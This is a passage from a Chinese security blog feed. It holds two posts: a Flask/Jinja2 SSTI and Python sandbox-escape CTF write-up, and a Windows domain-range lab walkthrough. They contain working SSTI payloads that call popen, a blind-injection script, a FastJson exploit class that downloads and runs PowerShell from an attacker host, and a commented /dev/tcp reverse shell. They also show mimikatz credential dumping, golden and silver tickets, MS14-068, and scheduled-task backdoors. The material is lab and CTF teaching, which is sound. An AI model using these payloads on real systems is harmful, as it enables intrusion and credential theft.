href="https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/#%E9%81%8D%E5%8E%86%E6%89%BE%E5%88%B0%E5%85%B6%E4%BB%96%E7%9A%84%E9%80%83%E9%80%B8%E6%96%B9%E6%B3%95" target="_blank" rel="noopener">Python沙箱逃逸总结</a></p><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>服务器端模板注入。既然谈到SSTI，在python中就要提一下flask，jinja2模板。此处利用网上一段代码</p><pre><code>from flask import Flaskfrom flask import request, render_template_string, render_templateapp = Flask(__name__)@app.route(&#39;/login&#39;)def hello_ssti():    person = {        &#39;name&#39;: &#39;hello&#39;,        &#39;secret&#39;: &#39;This_is_my_secret&#39;    }    if request.args.get(&#39;name&#39;):        person[&#39;name&#39;] = request.args.get(&#39;name&#39;)    template = &#39;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#39; % person[&#39;name&#39;]    return render_template_string(template, person=person)if __name__ == &quot;__main__&quot;:    app.run(debug=True)</code></pre><p>当如下请求的时候就会显示其他参数，比如secret</p><pre><code>http://127.0.0.1:5000/login?name={{person[%27secret%27]}}</code></pre><p>其中的<code>render_template_string</code>和另一个模板函数<code>render_template</code>区别在第一个参数是否可以传入字符串，但是传入字符串就一定会有问题吗？修改template参数</p><pre><code>from flask import Flaskfrom flask import request, render_template_stringapp = Flask(__name__)@app.route(&#39;/login&#39;)def hello_ssti():    person = {        &#39;name&#39;: &#39;hello&#39;,        &#39;secret&#39;: &#39;This_is_my_secret&#39;    }    if request.args.get(&#39;name&#39;):        person[&#39;name&#39;] = request.args.get(&#39;name&#39;)    template = &#39;&lt;h2&gt;Hello {{person.name }}!&lt;/h2&gt;&#39;    return render_template_string(template, person=person)if __name__ == &quot;__main__&quot;:    app.run(debug=True)</code></pre><p>做如下请求的时候，就会显示<code>Hello {{person['secret']}}!</code>，我们传入的参数被当作字符串显示出来。</p><pre><code>http://127.0.0.1:5000/login?name={{person[%27secret%27]}}</code></pre><p>name参数传入后，先修改person中的name值，person变成</p><pre><code>person = {        &#39;name&#39;: &#39;{{person['secret']}}&#39;,        &#39;secret&#39;: &#39;This_is_my_secret&#39;    }</code></pre><p>后面调用模板，来执行的时候，根据变量取值，又把<code>person.name</code>获取出来，传入<code>render_template_string</code>的就是<code>&#39;&lt;h2&gt;Hello {{person.name}}!&lt;/h2&gt;&#39;</code>，取值后整体被当作字符串显示。这里跟上面格式化字符串的时候不一样的地方就出来了，当我们直接传入<code>{{person['secret']}}</code>的时候，调用模板变量取值的时候，先格式化字符串，把传入字符串当作变量来处理。也就是<code>&#39;&lt;h2&gt;Hello {{person['secret']}}!&lt;/h2&gt;&#39;</code>加载到<code>render_template_string</code>。这又涉及到python的字符串格式化。</p><h3 id="字符串格式化"><a href="#字符串格式化" class="headerlink" title="字符串格式化"></a>字符串格式化</h3><p>在python中常见的字符串格式化有几种形式</p><h4 id="操作符"><a href="#操作符" class="headerlink" title="%操作符"></a>%操作符</h4><pre><code>&gt;&gt;&gt; name = &quot;aaa&quot;&gt;&gt;&gt; &#39;%s&#39; %name&#39;aaa&#39;</code></pre><h4 id="string-Template"><a href="#string-Template" class="headerlink" title="string.Template"></a>string.Template</h4><pre><code>&gt;&gt;&gt; from string import Template&gt;&gt;&gt; name = &#39;aaa&#39;&gt;&gt;&gt; tem = Template(&#39;$name&#39;)&gt;&gt;&gt; tem.substitute(name=name)&#39;aaa&#39;</code></pre><h4 id="format"><a href="#format" class="headerlink" title="format"></a>format</h4><p>python2.6后引用的格式化字符串的函数</p><pre><code>&gt;&gt;&gt; name = &#39;aaa&#39;&gt;&gt;&gt; &#39;{}&#39;.format(name)&#39;aaa&#39;</code></pre><h4 id="f-Strings"><a href="#f-Strings" class="headerlink" title="f-Strings"></a>f-Strings</h4><p>python3.6后新增的字符串格式化方式，可以执行其中的python语句。</p><pre><code>&gt;&gt;&gt; name = &#39;aaa&#39;&gt;&gt;&gt; f&#39;{name}&#39;&#39;aaa&#39;&gt;&gt;&gt; f&#39;{name.upper()}&#39;&#39;AAA&#39;</code></pre><p>如何利用字符串格式化来读取敏感文件</p><pre><code>def view(request, *args, **kwargs):    template = &#39;Hello {user}, This is your email: &#39; + request.GET.get(&#39;email&#39;)    return HttpResponse(template.format(user=request.user))</code></pre><p>如果控制了email参数就是控制了字符串格式化一部分，当传入<code>{user.password}</code>的时候就会显示用户的哈希密码。<code>user</code>是当前上下文中仅有的一个变量，也就是format函数传入的<code>user=request.user</code>，Django中<code>request.user</code>是当前用户对象，这个对象包含一个属性<code>password</code>，也就是该用户的密码。所以，<code>{user.password}</code>实际上就是输出了<code>request.user.password</code>。</p><p>以上代码：<a href="https://xz.aliyun.com/t/288" target="_blank" rel="noopener">Python格式化字符串漏洞</a>，<a href="https://mp.weixin.qq.com/s/Lj4nCz0hag-AKQF_s79fQw" target="_blank" rel="noopener">一文掌握CTF中Python全部考点</a></p><h3 id="CTF-利用"><a href="#CTF-利用" class="headerlink" title="CTF 利用"></a>CTF 利用</h3><p>下面用几个CTF题来感受一下。</p><h4 id="flask-真香"><a href="#flask-真香" class="headerlink" title="flask 真香"></a>flask 真香</h4><p><a href="https://github.com/NJUPT-coding-gay/NCTF2018/tree/master/Web/flask真香" target="_blank" rel="noopener">https://github.com/NJUPT-coding-gay/NCTF2018/tree/master/Web/flask%E7%9C%9F%E9%A6%99</a></p><p>不过这个环境现在搭建会有点问题，flask会使用的是最新1.1.2版本，显示的request.url会先url编码再显示到页面上，需要更改flask版本。</p><p>修改Dockerfile文件:</p><pre><code>RUN pip3 install flask==0.12.1RUN pip3 install MarkupSafe==1.0RUN pip3 install jinja2==2.9 RUN pip3 install Werkzeug==0.14.1</code></pre><p>启动后就能愉快的看到页面了</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150449.png" alt="image-20200422144323164"></p><p>禁用了不少关键词，然后使用的session对象来解决，就直接利用上手</p><p>在查找子父类的函数上，<code>__mro__</code>被禁用了，但是<code>__bases__</code>并没有。先找到object类</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150452.png" alt="image-20200422153648190"></p><p>然后再去获取子类，由于class被禁用，<code>__subclasses__</code>不能直接使用。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150453.png" alt="image-20200422160624948"></p><p>其中可以利用的有open和popen，open在<code>__builtins__</code>里面</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150455.png" alt="image-20200422170120593"></p><p>执行命令查找文件</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150458.png" alt="image-20200422170817564"></p><p>读取文件即可</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150500.png" alt="image-20200422170906003"></p><p>使用open，但是需要知道文件位置</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150502.png" alt="image-20200422171331227"></p><p>如果不想用session，或者session也不能用了，就需要更多的绕过方式，下面会提到这种。</p><pre><code>{{(((()|attr(("_"*2,"cla","ss","_"*2)|join)|attr(("_"*2,"bases","_"*2)|join))[0]|attr(("_"*2,"subcla","sses","_"*2)|join)())[102]|attr(("_"*2,"init","_"*2)|join)|attr(("_"*2,"globals","_"*2)|join)).get('pop'+'en')('cat%20/Th1s__is_S3cret').read()}}</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150506.png" alt="image-20200423171734174"></p><h4 id="flask-plus"><a href="#flask-plus" class="headerlink" title="flask plus"></a>flask plus</h4><p><a href="https://github.com/NJUPT-coding-gay/NCTF2018/tree/master/Web/Flask PLUS" target="_blank" rel="noopener">https://github.com/NJUPT-coding-gay/NCTF2018/tree/master/Web/Flask%20PLUS</a></p><p>同样的页面，说明应该是增加了过滤的东西，同样修改Dockerfile文件。</p><p>使用上一个POC，发现<code>__init__</code>被过滤了。至少到这一步是正常的</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150508.png" alt="image-20200423102101580"></p><p>然后只需要把<code>__init__</code>做拼接就行了</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150510.png" alt="image-20200423102442838"></p><p>如果某种情况下不能拼接，或者不想去这么做，也可以去查是否有替代属性。要求能替代<code>__init__</code>，要有<code>__globals__</code>属性。也就是重载过<code>__init__</code></p><pre><code>import osfor i in dir(os._wrap_close):    if &#39;__globals__&#39; in dir(eval(&#39;os._wrap_close.&#39;+i)):        print(i)</code></pre><p>大概符合标准的有</p><pre><code>__enter__   __exit__    __getattr__ __init__    __iter__    close       </code></pre><p>使用<code>__enter__</code></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150512.png" alt="image-20200423104717984"></p><p>使用<code>__getattr__</code>，不过这个被禁用了。需要拼接，这就跟上面<code>__init__</code>类似了。更换<code>__iter__</code></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150514.png" alt="image-20200423104853471"></p><p><code>close</code>也被禁用了。<code>__exit__</code>还可以使用</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150516.png" alt="image-20200423105018271"></p><h4 id="flask-改"><a href="#flask-改" class="headerlink" title="flask 改"></a>flask 改</h4><p>如果在过滤中只过滤了特殊符号，比如<code>__</code>这种，代码</p><pre><code>#!/usr/bin/env python# -*- coding: utf-8 -*-from flask import Flask,render_template,render_template_string,redirect,request,session,abort,send_from_directoryimport osapp = Flask(__name__)@app.route(&quot;/&quot;)def index():    &quot;主页&quot;    return render_template(&quot;index2.html&quot;)@app.route(&#39;/user&#39;)def user():    def safe_jinja(s):        blacklist = [&#39;__class__&#39;,&#39;__init__&#39;,&#39;__&#39;]        flag = True        for no in blacklist:            if no.lower() in s.lower():               flag= False               break        return flag    template = &#39;&#39;&#39;{%% block body %%}    &lt;div class=&quot;center-content error&quot;&gt;        &lt;h3&gt;%s&lt;/h3&gt;    &lt;/div&gt; {%% endblock %%}&#39;&#39;&#39; % (request.url)    if safe_jinja(request.args.get(&#39;name&#39;)):        return render_template_string(template)    else:        return render_template_string(&quot;&lt;h2&gt;NO!&lt;/h2&gt;&quot;)if __name__ == &quot;__main__&quot;:    app.run(host=&#39;0.0.0.0&#39;,port=5000)</code></pre><p>如果是上面这种对参数过滤的形式，<code>request.args.param</code>来获取新参数的值</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150519.png" alt="image-20200423143634582"></p><p>如果是把<code>[]</code>也过滤掉，就需要用jinja2模板函数来处理，比如<code>attr()</code></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150521.png" alt="image-20200423144945343"></p><p>构造请求</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150523.png" alt="image-20200423143742243"></p><p>现在可以看到上面过滤掉了<code>__class__</code>，这种也可以采用</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150526.png" alt="image-20200423144033662"></p><p>如何利用这种过滤来获取flag，其中由于中括号被禁用，利用列表的pop方法。但是元组没有pop方法，所以需要先转换成list，再去调用，字典可以使用get()获取键值。原flag文件名带双下划线改成单下划线了。如果其中的某个字符串关键词，比如<code>class</code>被禁用，直接拼接来绕过就行。</p><pre><code>{{(((request|attr(("_"*2,"class","_"*2)|join)|attr(("_"*2,"mro","_"*2)|join)|list).pop(-1)|attr(("_"*2,"subclasses","_"*2)|join)()).pop(258)|attr(("_"*2,"init","_"*2)|join)|attr(("_"*2,"globals","_"*2)|join)).get(("_"*2,"builtins","_"*2)|join).get('open')('Th1s_is_F1114g').read()}}</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150528.png" alt="image-20200423155904496"></p><p>原代码中是过滤掉<code>join</code>的，所以这里也可以使用<code>format</code>来处理</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150530.png" alt="image-20200423145253095"></p><p>完整的利用就是</p><pre><code>{{(((request|attr(request.args.f|format(request.args.a))|attr(request.args.f|format(request.args.b))|list).pop(-1)|attr(request.args.f|format(request.args.c))()).pop(118)|attr(request.args.f|format(request.args.d))|attr(request.args.f|format(request.args.e))).get('popen')('cat%20Th1s_is_F1114g').read()}}&amp;f=%s&amp;a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=__init__&amp;e=__globals__</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150532.png" alt="image-20200423162231707"></p><p>再如果觉得其他参数中这种形式会被禁用，也可以更多参数分化执行。<code>request.args</code>也可以改为<code>request.values</code>。</p><pre><code>{{(((request|attr(request.args.f|format(request.args.h,request.args.h,request.args.a,request.args.h,request.args.h))|attr(request.args.f|format(request.args.h,request.args.h,request.args.b,request.args.h,request.args.h))|list).pop(-1)|attr(request.args.f|format(request.args.h,request.args.h,request.args.c,request.args.h,request.args.h))()).pop(118)|attr(request.args.f|format(request.args.h,request.args.h,request.args.d,request.args.h,request.args.h))|attr(request.args.f|format(request.args.h,request.args.h,request.args.e,request.args.h,request.args.h))).get('popen')('cat%20Th1s_is_F1114g').read()}}&amp;f=%s%s%s%s%s&amp;h=_&amp;a=class&amp;b=mro&amp;c=subclasses&amp;d=init&amp;e=globals </code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150534.png" alt="image-20200423163319930"></p><h4 id="flask-魔改"><a href="#flask-魔改" class="headerlink" title="flask 魔改"></a>flask 魔改</h4><p>如果禁用<code>{{ }}</code>这种符号，同时保持上面符号的禁用。默认的Jinja分隔符配置如下：</p><pre><code>{% ... %}用于声明{{ ... }}用于将表达式打印到模板输出用于注释不包括在模板输出#  ... ##用于行语句</code></pre><p>使用if的逻辑语句，由于不能直接用表达式打印，所以用以下布尔判断，循环pop中的值，得到334</p><pre><code>{%%20if%20((request|attr(("_"*2,"class","_"*2)|join)|attr(("_"*2,"mro","_"*2)|join)|list).pop(-1)|attr(("_"*2,"subclasses","_"*2)|join)()).pop(334)|string=="<class%20'os._wrap_close'>"%20%}111{%%20endif%20%}</class%20'os._wrap_close'></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150536.png" alt="image-20200424105108660"></p><p>但是最后获取的时候，需要对字符串进行截取，切片已经不能使用了，只能从字符串的方法中查找，可用的恰好有<code>index</code>，<code>find</code>，可以指定范围查找，比如<code>index</code>，指定范围从0开始，结束为1，如果为指定字符串返回正常，不然返回异常。</p><pre><code>{%%20if%20((((request|attr(("_"*2,"class","_"*2)|join)|attr(("_"*2,"mro","_"*2)|join)|list).pop(-1)|attr(("_"*2,"subclasses","_"*2)|join)()).pop(334)|attr(("_"*2,"init","_"*2)|join)|attr(("_"*2,"globals","_"*2)|join)).get('popen')('cat%20Th1s_is_F1114g').read()|string).index('n',0,1)%20%}{%%20endif%20%}</code></pre><p>使用类似如下的盲注脚本</p><pre><code># -*- coding: utf-8 -*-import requestsdef check(payload):    url = &#39;http://x.x.x.x:19009/user?name=&#39;+payload    r = requests.get(url)    if r.status_code == 200:        return Truepassword  = &#39;&#39;s = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$()&lt;=&gt;{|}_&#39;for i in range(0,40):    for c in s:        payload = &#39;{%%20if%20((((request|attr(("_"*2,"class","_"*2)|join)|attr(("_"*2,"mro","_"*2)|join)|list).pop(-1)|attr(("_"*2,"subclasses","_"*2)|join)()).pop(334)|attr(("_"*2,"init","_"*2)|join)|attr(("_"*2,"globals","_"*2)|join)).get("popen")("cat%20Th1s_is_F1114g").read()|string).index("'+c+'",'+str(i)+','+str(i+1)+')%20%}{%%20endif%20%}&#39;         if check(payload):            password += c            break    print(password)</code></pre><p>结果如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150543.png" alt="image-20200424120151112"></p><h4 id="flask-究极改"><a href="#flask-究极改" class="headerlink" title="flask 究极改"></a>flask 究极改</h4><p>在把<code>join</code>禁掉，还有<code>format</code>，把<code>values</code>和<code>args</code>也禁掉，不能从其他参数获取，这样上面的绕过就算是不能用了。</p><pre><code>blacklist = [&#39;__class__&#39;,&#39;__&#39;,&#39;[&#39;,&#39;]&#39;,&#39;join&#39;,&#39;values&#39;,&#39;args&#39;,&#39;format&#39;]</code></pre><p>查找一个request有关系的属性，尝试<code>form</code>，比如支持POST方法的话。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150545.png" alt="image-20200424132808887"></p><p>利用cookie参数</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150547.png" alt="image-20200424133033655"></p><p>利用请求头</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150549.png" alt="image-20200424133405205"></p><p>连起来就是，获取object子类。</p><pre><code>{{((request|attr(request.cookies.get('aa'))|attr(request.cookies.get('bb'))|list).pop(-1))|attr(request.cookies.get('cc'))()}}Cookie: aa=__class__;bb=__mro__;cc=__subclasses__</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150550.png" alt="image-20200424140101732"></p><h3 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h3><p>在flask plus中，采用的是session对象来解决问题，虽然在上一题中采用的是元组对象，但是只是因为其中没有禁用join，如果在plus中也禁用了session，还能怎么处理。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150552.png" alt="image-20200424141236793"></p><p>但实际并没有这么理想</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150555.png" alt="image-20200424145056229"></p><p>这里面能采用的还有哪些，比如</p><pre><code>{{(((redirect|attr('__cla'+'ss__')|attr('__mr'+'o__')|list)[-1]|attr('__subcla'+'sses__')())[342]|attr('__in'+'it__')|attr('__globals__'))['pop'+'en']('cat%20/Th1s_is_F1114g').read()}}</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150557.png" alt="image-20200424145127596"></p><p>如果<code>attr</code>被禁用，这种也不能使用，或者能使用<code>__getattribute__</code>替代，但是原代码里已经禁用了。</p><p>文章参考：<a href="https://hatboy.github.io/2018/04/19/Python沙箱逃逸总结" target="_blank" rel="noopener">Python沙箱逃逸总结</a>，<a href="https://xz.aliyun.com/t/52" target="_blank" rel="noopener">Python沙箱逃逸的n种姿势</a>，<a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">一文看懂Python沙箱逃逸</a>，<a href="https://xz.aliyun.com/t/288" target="_blank" rel="noopener">Python格式化字符串漏洞</a>，<a href="https://mp.weixin.qq.com/s/Lj4nCz0hag-AKQF_s79fQw" target="_blank" rel="noopener">一文掌握CTF中Python全部考点</a>，<a href="https://0day.work/jinja2-template-injection-filter-bypasses/" target="_blank" rel="noopener">Jinja2 template injection filter bypasses</a>，<a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">Flask/Jinja2模板注入中的一些绕过姿势</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;沙箱逃逸概述&quot;&gt;&lt;a href=&quot;#沙箱逃逸概述&quot; class=&quot;headerlink&quot; title=&quot;沙箱逃逸概述&quot;&gt;&lt;/a&gt;沙箱逃逸概述&lt;/h2&gt;&lt;p&gt;沙箱逃逸就是在在一个严格限制的python环境中，通过绕过限制和过滤达到执行更高权限，甚至getshell的
      
    
    </summary>
    
    
      <category term="python" scheme="/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>域靶场WP</title>
    <link href="/2020/04/%E5%9F%9F%E9%9D%B6%E5%9C%BAWP/"/>
    <id>/2020/04/域靶场WP/</id>
    <published>2020-04-10T08:31:54.000Z</published>
    <updated>2020-04-10T08:32:09.028Z</updated>
    
    <content type="html"><![CDATA[<p>域环境利用已有靶场，简单方便<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></p><p>web环境漏洞FastJson。利用<a href="https://github.com/RealBearcat/FastJson-JdbcRowSetImpl-RCE" target="_blank" rel="noopener">https://github.com/RealBearcat/FastJson-JdbcRowSetImpl-RCE</a> 修改而来</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114455.png" alt="image-20200407153757538"></p><p>参数为json字符串，可以简单的使用如下探测是否存在问题。</p><pre><code>{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}{&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}{&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;}}</code></pre><p>比如，此处使用burp的DNS监听</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114500.png" alt="image-20200407140108169"></p><p>执行后会发现，说明存在问题。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114502.png" alt="image-20200407140121264"></p><p>至于版本，可以在一般测试中，构造错误的json字符串查看报错信息，但此处没有错误显示，直接使用几个较高版本的POC测试。</p><p>此处直接使用47的POC，由于是Windows系统，则利用cs使用powershell来反弹shell。</p><pre><code>import java.lang.Runtime;import java.lang.Process;public class Exploit {    public Exploit(){        try{            // Runtime.getRuntime().exec(&quot;/bin/bash -i &gt;&amp;/dev/tcp/192.168.120.130/8888&lt;&amp;1&quot;);            Runtime.getRuntime().exec(&quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(\&#39;http://192.168.120.130:80/a\&#39;))\&quot;&quot;);        }catch(Exception e){            e.printStackTrace();        }    }    public static void main(String[] argv){        Exploit e = new Exploit();    }}</code></pre><p>执行后，在cs端就可以收到shell了。利用ms15-051提权，提权模块可能是添加的插件。获得system权限。还可以看到存在一个内网地址10.10.10.80。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114504.png" alt="image-20200408095902201"></p><p>利用mimikatz获取密码，只能读取到当前登陆账号的明文密码。</p><pre><code>mimikatz sekurlsa::logonpasswords</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114506.png" alt="image-20200408134439940"></p><p>不过如果使用了管理员账号来执行操作修改配置，也可以读取到管理员hash。如果使用明文密码登陆修改就可以抓到。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114508.png" alt="image-20200408151440720"></p><p>如果提示报错，尝试修改注册表</p><pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></pre><p>收集信息可知以下信息</p><pre><code>域名：DC.de1ay.com域主机：10.10.10.10域用户：Administrator，delay,mssql域管理员：Administrator两个网卡：192.168.120.0/24，10.10.10.0/24主机：存在两个主机(192.168.120.201，10.10.10.10)存在360主机防御系统，不过并没有干涉</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114510.png" alt="image-20200408100546410"></p><p>尝试利用de1ay用户来登陆PC，利用psexec登陆不成功。</p><p>使用psexec登陆，DC机显示成功但是没有获得shell，可能是没成功把</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114512.png" alt="image-20200408155334127"></p><p>然后利用net共享，先用mimikatz生成pth凭据。</p><pre><code>sekurlsa::pth /domain:. /user:Administrator /ntlm: 70be8675cd511daa9be4b8f49e829327</code></pre><p>net和psexec的时候还是不成功，报错。利用cs自身的pth模块执行，还是报错，拒绝访问</p><pre><code>pth DE1AY\de1ay 161cff084477fe596a5db81874498a24</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114514.png" alt="image-20200408163645027"></p><p>再尝试利用金票，直接登陆到主机上，上传mimikatz执行。</p><pre><code>lsadump::dcsync /domain:de1ay.com /user:krbtgt</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114515.png" alt="image-20200409164051760"></p><p>得到HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi  </p><pre><code>kerberos::golden /admin:administrator /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /krbtgt:82dfc71b72a11ef37d663047bc2088fb /ticket:golden.kiribi</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114517.png" alt="image-20200409164616356"></p><p>通过mimikatz中的kerberos::ptt将golden.kiribi导入内存中 </p><pre><code>kerberos::purge   //删除票据kerberos::ptt golden.kiribi  //导入票据kerberos::list  //查看票据</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114519.png" alt="image-20200409164906689"></p><p>查看DC域主机默认共享，可以连接到域主机，上传文件执行。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114520.png" alt="image-20200409165120018"></p><p>先利用域内主机创建一个端口转发，先创建一个dns的监听，然后利用已有shell。再去创建一个listener。如下dc。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114522.png" alt="image-20200409172526385"></p><p>或者直接利用已有shell来创建listener，再生成exe。利用dc监听来生成exe</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114524.png" alt="image-20200409172758964"></p><p>利用<code>copy beacon.exe \\DC.de1ay.com\c$\Users\de1ay\</code>到DC主机上</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114526.png" alt="image-20200409170358135"></p><p>创建计划任务执行后门，很快就有DC主机上线了。</p><pre><code>schtasks /create /s DC.de1ay.com /ru &quot;SYSTEM&quot; /tn testdc /sc DAILY /tr C:\\Users\\de1ay\\beacon.exe /Fschtasks /run /s DC.de1ay.com /tn testdc /i</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114527.png" alt="image-20200409173044533"></p><p>对于用户PC机，同样可以利用金票来执行，后面的操作和上面类似。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114529.png" alt="image-20200409174013572"></p><p>最后就可以获得shell。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114530.png" alt="image-20200409174748884"></p><p>再尝试使用银票，生成前删除全部票据，不能访问。</p><pre><code>klist purge</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114532.png" alt="image-20200410090753302"></p><p>这里使用de1ay的hash</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114534.png" alt="image-20200410091300403"></p><pre><code>kerberos::golden /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /target:DC.de1ay.org /service:cifs /rc4:161cff084477fe596a5db81874498a24 /user:de1ay /ptt</code></pre><p>这里使用/ptt直接导入内存，或者先生成票据，再使用上面的kerberos::ptt导入内存。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114536.png" alt="image-20200410091815717"></p><p>查看是否可以访问</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114538.png" alt="image-20200410091924771"></p><p>同样shell以后可以看到是个用户权限</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114540.png" alt="image-20200410092340435"></p><p>在尝试使用ms14-068，DC机是Windows2012，没有补丁KB3011780，同样删除票据</p><p>由于主机上没有python环境，pykek不能使用，暂时没有exe版本的pykek。下载使用编译完成的exe文件</p><p><a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068" target="_blank" rel="noopener">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p><pre><code>ms14-068.exe -u de1ay@de1ay.com -s S-1-5-21-2756371121-2868759905-3853650604 -d DC.de1ay.com</code></pre><p>生成cache缓存文件，再使用mimikatz来导入</p><pre><code>kerberos::ptc TGT_de1ay@de1ay.com.ccache</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114542.png" alt="image-20200410100442974"></p><p>不过回过头看，之前在cs中执行利用psexec和已有凭据执行psh的时候应该是成功的。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114544.png" alt="image-20200410113800119"></p><p>执行后在DC上会有短暂的ps调用显示，但至于为啥没有回显和连接，也许是连接错误。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;域环境利用已有靶场，简单方便&lt;a href=&quot;http://vulnstack.qiyuanxuetang.net/vuln/detail/3/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://vulnstack.qiyuanxuetang.n
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>APP应用安全检测</title>
    <link href="/2020/04/APP%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B/"/>
    <id>/2020/04/APP应用安全检测/</id>
    <published>2020-04-10T08:30:24.000Z</published>
    <updated>2020-04-10T08:30:33.382Z</updated>
    
